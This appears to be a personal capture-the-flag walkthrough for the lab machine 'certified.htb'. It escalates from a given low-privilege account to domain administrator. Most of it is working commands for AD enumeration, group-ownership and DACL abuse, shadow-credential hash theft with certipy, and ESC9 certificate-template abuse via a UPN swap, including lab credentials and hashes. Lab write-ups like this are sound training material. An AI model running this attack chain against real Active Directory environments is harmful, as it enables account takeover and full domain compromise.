starting with creds judith.mader:judith09
starting with nmap, standard ldap, smb, rpc open. no webpage
anonymous,guest,null smb gives nada
nothing interesting in smb for judith's shares. no winrm, rdp accesses
rpcclient enum give users list
`rpcclient -U "judith.mader" certified.htb`
kerbrute to validate
`./kerbrute userenum --dc 10.129.231.186 -d certified.htb users.txt`
no asrep roast. kerbroast for management_svc was uncrackable(exhausted)

`bloodhound-ce-python -u 'judith.mader' -p 'judith09' -ns 10.129.231.186 -d certified.htb -c All --zip`
blodhound shows judith is a member of Certificate DCOM

So we lookup vulnerable templates
`certipy-ad find -u 'judith.mader' -p judith09 -dc-ip 10.129.231.186 -stdout -vulnerable` --nothing to be found here!

However, since the name of the box is certified, a strong sus that it has to do with ADCS.
So we look at it mannually..initially, there are like 32 certs.
We wanna look for something that stands out, such as "Enrollment Rights" that have groups other than the defaults, like Domain Admins, or Enterprise admins, or RAS and IAS servers.

`certipy-ad find -u 'judith.mader' -p judith09 -dc-ip 10.129.231.186 -json`

then build a query to filter all certs which have something more that the above mentions
```zsh
cat 20260118215542_Certipy.json | jq .' "Certificate Templates" | to_entries[] | select(all(.value.Permissions."Enrollment Permissions"."Enrollment Rights"[]; test("domain";"i") or test("enterprise";"i")) | not)'

#OR, put it a little better in a .sh file, and execute it
cat 20260118215542_Certipy.json | jq '
 ."Certificate Templates"|
	 to_entries[]|
	 select(all(.value.Permissions."Enrollment Permissions"."Enrollment Rights"[]; test("domain";"i") or test("enterprise";"i")) | not)'
```

now, we see 2 certs, one has "operator CA group" the other one has RAS and IAS group.
The Operator CA group is the one for us. That is our High-value target, we need to find a path to, from judith

Bloodhound also shows a path Judith -> Management -> management_svc -> ca_operators
Judith has "WriteOwner" relation over management group. Which means, we can overwrite the owner of that group, give ourselves the dacl permission of FullAccess, and add ourselves to that group.

`impacket-owneredit -action write -new-owner judith.mader -target management certified.htb/judith.mader:judith09`
`impacket-dacledit -action write -rights FullControl -principal judith.mader -target management certified.htb/judith.mader:judith09`

`net rpc group addmem Management judith.mader -U certified.htb/judith.mader%judith09 -S 10.129.231.186`

verify addmember using
`net rpc group members Management -U certified.htb/judith.mader%judith09 -S 10.129.231.186`

Now, get management_svc's ntlm hash using shadow attack
`certipy-ad shadow auto -username judith.mader@certified.htb -password judith09 -account management_svc -dc-ip 10.129.231.186`
Then chain the obtained NTLM hash to perform the same thing on ca_operator
`certipy-ad shadow auto -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -account ca_operator -dc-ip 10.129.231.186`
Note - `faketime "$(sudo ntpdate -q 10.129.231.186 | awk '{print $1 " " $2}')" <cmd>` to avoid time_skew_errors

We now own ca_operator hash:b4b86f45c6018f1b664f70805f45d8f2,
we use these creds to check vulnerable templates again
`certipy-ad find -u 'ca_operator' -hashes b4b86f45c6018f1b664f70805f45d8f2 -dc-ip 10.129.231.186 -stdout -vulnerable`
this shows us that the template we initially found, is vulnerable to ESC9

ESC9 is when No Security extension on Certificate template.
We need an account on which we have a GenericWrite relation. (in our case, ca_operator)
We can use this account, and temporarily overwrite it's upn to of administrator (not administrator@domain, there's a difference, and it wont work)
Then we request certificate on behalf of the user, which has administrator upn.
Change back the upn to our own (or something else)
Then use the certificate to authenticate as administrator

use A to set B's upn to Admin
`certipy-ad account update -dc-ip 10.129.231.186 -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator`

request certificate as B, which has Administrator as upn (not to be done in this command as req -upn, tried and failed. has to be account update first, then req), and get the admin.pfx
`certipy-ad req -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -dc-ip 10.129.231.186 -ca certified-DC01-CA -template CertifiedAuthentication`

change B's upn to something else, literally anything, doesnt matter
`certipy-ad account update -dc-ip 10.129.231.186 -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn literallyAnythin`

Authenticate using admin.pfx file we recieved, but remember to specify the domain
`certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.231.186 -domain certified.htb`
If you dont specify the domain, since the sid is not set in the pfx, the authentication goes as just administrator. with the domain specified, it goes to administrator@certified.htb

winrm using admin's ntlm hash!
